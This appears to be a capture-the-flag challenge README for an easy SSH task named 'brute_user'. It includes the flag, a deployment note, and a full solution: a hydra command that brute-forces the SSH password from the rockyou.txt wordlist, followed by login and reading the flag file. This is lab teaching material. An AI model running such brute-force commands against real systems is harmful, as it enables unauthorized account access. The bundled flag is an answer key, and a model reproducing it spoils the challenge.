**Name** : brute_user

**Category** : Network

**Difficulty** : Easy

**Flag** : HACKING_BRAWL{y0u_ar3_a_brut3F0rc3_n1nja}

**Challenge description** : 
Mr brute_user was a former hackershala employee. Our CEO has doubts that Mr brute_user is secretly working with an illicit organization. We have Mr brute_user's IP address and SSH port but don't have access to the password. According to his previous records, he is a careless man when it comes to passwords. Can you break in and bring us the sensitve information?

Server IP - `put-ip-here`

SSH port - `put-port-number-here`

**Background**: 

+ Deploy the docker file using `execute.sh` or as per your own requirement.

+ The victim named `brute_user` uses a weak password which is available in `rockyou.txt`

+ Our user will need to run the following hydra script to brute force the password.   
  `hydra -s <port-number> -l brute_user -P ./path/to/rockyou.txt <server-IP> -t 4 ssh -I -v`
  
+ The password will be brute forced within seconds.
  
+ User will then gain ssh access to the server using `ssh brute_user@server-ip -p port-number`.

+ Once they have ssh access all they need to do is run `cat flag.txt`.
